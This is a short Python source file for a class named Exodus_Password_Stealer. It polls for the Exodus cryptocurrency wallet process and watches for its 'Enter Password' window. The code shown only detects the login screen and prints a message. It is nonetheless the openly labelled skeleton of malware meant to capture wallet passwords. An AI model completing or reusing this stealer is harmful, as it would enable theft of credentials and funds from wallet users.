import time

from typing import Union
from modules.tasks import Tasks
from modules.current_window import Current_Window

class Exodus_Password_Stealer:
    def __init__(self, exectuable_name: str) -> None:
        self.executable_name: str = exectuable_name
        
    def check_if_running(self) -> Union[str, bool]:
        is_running_result: any = Tasks.is_running(executable_name=self.executable_name)
        
        if is_running_result == True or is_running_result == False:
            return is_running_result
        else:
            return None   
        
    def current_active_window(self) -> dict[str]:
        return Current_Window.fetch_one()
    
    def start_listener(self):
        while True:
            if self.check_if_running() == True:
                current_active_window: dict[str] = self.current_active_window()
                
                if current_active_window["title"] == "Enter Password":
                    print("exodus login screen is open")
                
                time.sleep(0.2)
        
if __name__ == "__main__":
    Stealer_Object: object = Exodus_Password_Stealer("Exodus.exe")
    Stealer_Object.start_listener()